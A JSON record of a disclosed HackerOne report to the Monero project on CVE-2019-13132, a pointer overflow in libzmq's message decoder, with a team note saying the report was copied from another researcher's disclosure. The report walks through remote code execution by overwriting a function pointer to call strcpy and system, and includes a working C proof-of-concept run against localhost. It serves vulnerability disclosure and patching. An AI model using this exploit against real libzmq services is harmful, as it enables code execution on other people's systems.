@@ -1,0 +1,148 @@
+{
+  "id": 652911,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTI5MTE=",
+  "url": "https://hackerone.com/reports/652911",
+  "title": "CVE-2019-13132 - libzmq 4.1 series is vulnerable",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-07-22T08:00:22.223Z",
+  "submitted_at": "2019-07-22T08:00:22.223Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "evertonmelo",
+    "url": "/evertonmelo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/297/601/ad3b433db0eced5113f6d2c7420e67426dea55dc_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-13132"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-11-18T23:01:35.183Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-11-18T21:39:21.649Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nA pointer overflow, with code execution, was discovered in ZeroMQ libzmq (aka 0MQ) 4.2.x and 4.3.x before 4.3.1. A v2_decoder.cpp zmq::v2_decoder_t::size_ready integer overflow allows an authenticated attacker to overwrite an arbitrary amount of bytes beyond the bounds of a buffer, which can be leveraged to run arbitrary code on the target system. The memory layout allows the attacker to inject OS commands into a data structure located immediately after the problematic buffer (i.e., it is not necessary to use a typical buffer-overflow exploitation technique that changes the flow of control).  \n\n## Releases Affected:\n\nMonero <v0.14.1.0 ( all version ). \n\n## Steps To Reproduce:\n\nIn src/v2_decoder.cpp zmq::v2_decoder_t::eight_byte_size_ready(), the attacker can provide an uint64_t of his choosing:\n\n 85 int zmq::v2_decoder_t::eight_byte_size_ready (unsigned char const *read_from_)\n 86 {\n 87     //  The payload size is encoded as 64-bit unsigned integer.\n 88     //  The most significant byte comes first.\n 89     const uint64_t msg_size = get_uint64 (_tmpbuf);\n 90 \n 91     return size_ready (msg_size, read_from_);\n 92 }\n\nThen, in src/v2_decoder.cpp zmq::v2_decoder_t::size_ready(), a comparison is performed to check if this peer-supplied msg_size_ is within the bounds of the currently allocated block of memory:\n\n117     if (unlikely (!_zero_copy\n118                   || ((unsigned char *) read_pos_ + msg_size_\n119                       > (allocator.data () + allocator.size ())))) {\n\nThis is inadequate because a very large msg_size_ will overflow the pointer (read_pos_).\nIn other words, the comparison will compute as 'false' even though msg_size_ bytes don't fit in the currently allocated block.\nExploit details\n\nNow that msg_size_ has been set to a very high value, the attacker is allowed to send this amount of bytes, and libzmq will copy it to its internal buffer without any further checks.\n\nThis means that it's possible to write beyond the bounds of the allocated space.\n\nHowever, for the exploit this is not necessary to corrupt memory beyond the buffer proper.\n\nAs it turns out, the space the attacker is writing to is immediately followed by a struct content_t block:\n\n 67     struct content_t\n 68     {\n 69         void *data;\n 70         size_t size;\n 71         msg_free_fn *ffn;\n 72         void *hint;\n 73         zmq::atomic_counter_t refcnt;\n 74     };\n\nSo the memory layout is such that the receive buffer is immediately followed by data, then size, then ffn, then hint, then refcnt.\nNote that the receive buffer + the struct content_t is a single, solid block of memory; by overwriting beyond the designated receive buffer's bounds, no dlmalloc state variables in memory (like bk, fd) are corrupted (or, in other words, it wouldn't trigger AddressSanitizer).\n\nThis means that the attacker can overwrite all these members with arbitrary values.\n\nffn is a function pointer, that upon connection closure, is called with two parameters, data and hint.\n\nThis means the attacker can call an arbitrary function/address with two arbitrary parameters.\n\nIn my exploit, I set ffn to the address of strcpy, set the first parameter to somewhere in the executable's .data section, and the second parameter to the address of the character I want to write followed by a NULL character.\n\nSo for instance, if i want to write a 'g' character, I search the binary for an occurrence of 'g\\x00', and use this address as the second value to my strcpy call.\n\nFor each character of the command I want to execute on the remote machine, I make a separate request to write that character to the .data section.\nSo if I want to execute 'gnome-calculator', I first write a 'g', then a 'n', then an 'o', and so on, until the full 'gnome-calculator' string is written to .data.\n\nIn the next request, I overwrite the 'data' member of struct content_t with the address of the .data section (where now gnome-calculator resides), set the ffn member to the system libc function, and hint to NULL.\n\nIn effect, this calls system(\"gnome-calculator\"), by which this command is executed on the remote machine.\nExploit\n\nThe following is a self-exploit, that demonstrates the exploit flow as explained above.\n\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <zmq.hpp>\n#include <string>\n#include <iostream>\n#include <unistd.h>\n#include <thread>\n#include <mutex>\n\nclass Thread {\n    public:\n    Thread() : the_thread(&Thread::ThreadMain, this)\n    { }\n    ~Thread(){\n    }\n    private:\n    std::thread the_thread;\n    void ThreadMain() {\n        zmq::context_t context (1);\n        zmq::socket_t socket (context, ZMQ_REP);\n        socket.bind (\"tcp://*:6666\");\n\n        while (true) {\n            zmq::message_t request;\n\n            // Wait for next request from client\n            try {\n                socket.recv (&request);\n            } catch ( ... ) { }\n        }\n    }\n};\n\nstatic void callRemoteFunction(const uint64_t arg1Addr, const uint64_t arg2Addr, const uint64_t funcAddr)\n{\n    int s;\n    struct sockaddr_in remote_addr = {};\n    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)\n    {\n        abort();\n    }\n    remote_addr.sin_family = AF_INET;\n    remote_addr.sin_port = htons(6666);\n    inet_pton(AF_INET, \"127.0.0.1\", &remote_addr.sin_addr);\n\n    if (connect(s, (struct sockaddr *)&remote_addr, sizeof(struct sockaddr)) == -1)\n    {\n        abort();\n    }\n\n    const uint8_t greeting[] = {\n        0xFF, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Unused */\n        0x01, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */\n        0x01, /* Selects ZMTP_2_0 in zmq::stream_engine_t::select_handshake_fun */\n        0x00, /* Unused */\n    };\n    send(s, greeting, sizeof(greeting), 0);\n\n    const uint8_t v2msg[] = {\n        0x02, /* v2_decoder_t::eight_byte_size_ready */\n        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* msg_size */\n    };\n    send(s, v2msg, sizeof(v2msg), 0);\n\n    /* Write UNTIL the location of zmq::msg_t::content_t */\n    size_t plsize = 8183;\n    uint8_t* pl = (uint8_t*)calloc(1, plsize);\n    send(s, pl, plsize, 0);\n    free(pl);\n\n    uint8_t content_t_replacement[] = {\n        /* void* data */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n        /* size_t size */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n        /* msg_free_fn *ffn */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n        /* void* hint */\n        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    };\n\n    /* Assumes same endianness as target */\n    memcpy(content_t_replacement + 0, &arg1Addr, sizeof(arg1Addr));\n    memcpy(content_t_replacement + 16, &funcAddr, sizeof(funcAddr));\n    memcpy(content_t_replacement + 24, &arg2Addr, sizeof(arg2Addr));\n\n    /* Overwrite zmq::msg_t::content_t */\n    send(s, content_t_replacement, sizeof(content_t_replacement), 0);\n\n    close(s);\n    sleep(1);\n}\n\nchar destbuffer[100];\nchar srcbuffer[100] = \"ping google.com\";\n\nint main(void)\n{\n    Thread* rt = new Thread();\n    sleep(1);\n\n    callRemoteFunction((uint64_t)destbuffer, (uint64_t)srcbuffer, (uint64_t)strcpy);\n\n    callRemoteFunction((uint64_t)destbuffer, 0, (uint64_t)system);\n\n    return 0;\n}\n\nNotes\n\nCrucial to this exploit is knowing certain addresses, like strcpy and system, though the address of strcpy could be replaced with any executable location that contains stosw / ret or anything else that moves [rsi] to [rdi], and system might be replaced with code that executes the string at rsi.\n\nI did not find any other vulnerabilities in libzmq, but if there is any information leaking vulnerability in libzmq, or the application that uses it, that would allow the attacker to calculate proper code offsets, this would defeat ASLR.\nResolution\n\nResolution of this vulnerability must consist of preventing pointer arithmetic overflow in src/v2_decoder.cpp zmq::v2_decoder_t::size_ready().\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n## source code vulnerable: \nhttps://github.com/monero-project/monero/blob/master/contrib/depends/packages/zeromq.mk\n\n## fix:\nhttps://github.com/zeromq/libzmq/releases/tag/v4.3.1 \n\n# poc:\nhttps://github.com/zeromq/libzmq/issues/3351 \n\n## References:\n\nhttps://github.com/zeromq/libzmq/issues/3351\nhttps://github.com/zeromq/libzmq/releases/tag/v4.3.1\n    DEBIAN: https://www.debian.org/security/2019/dsa-4368\n    GENTOO:GLSA-201903-22 https://security.gentoo.org/glsa/201903-22\n\n## Impact\n\nA pointer overflow, with code execution, was discovered in ZeroMQ libzmq (aka 0MQ) 4.2.x and 4.3.x before 4.3.1.",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-12-18T21:39:21.732Z",
+  "allow_singular_disclosure_after": -201040080.7266774,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "who-biz",
+    "razordefcon"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 24913,
+      "category": "team",
+      "content": "NB: this disclosure [was stolen (!!) from Guido Vranken's original disclosure](https://twitter.com/GuidoVranken/status/1317547557481054208) without any credit given to him. We missed that this was ripped straight from there as our focus was on reproducing the issue and fixing it. This is beyond scummy. Please don't do this. We've reached out to Guido to pay him a bounty; sadly we can't redact the bounty from Everton Melo.",
+      "updated_at": "2020-10-19T09:50:31.892Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 45611,
+        "username": "fluffypony",
+        "name": "Riccardo Spagni",
+        "bio": null,
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": null,
+        "created_at": "2015-12-09T10:44:41.661Z",
+        "url": "https://hackerone.com/fluffypony",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
